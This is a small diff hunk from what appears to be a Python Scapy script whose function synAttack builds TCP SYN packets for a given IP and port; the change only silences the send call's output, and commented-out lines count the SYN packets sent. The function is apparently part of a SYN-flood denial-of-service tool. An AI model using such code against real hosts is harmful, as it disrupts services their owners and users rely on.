@@ -42,7 +42,7 @@ def synAttack(ip, port):
         t.dport = port
         t.flags = 'S'
 
-        send(i/t)
+        send(i/t, verbose=False)
         #count = count + 1 
         #print("Send "+str(ip)+":"+str(port)+" a SYN packets, Count："+str(count))
 
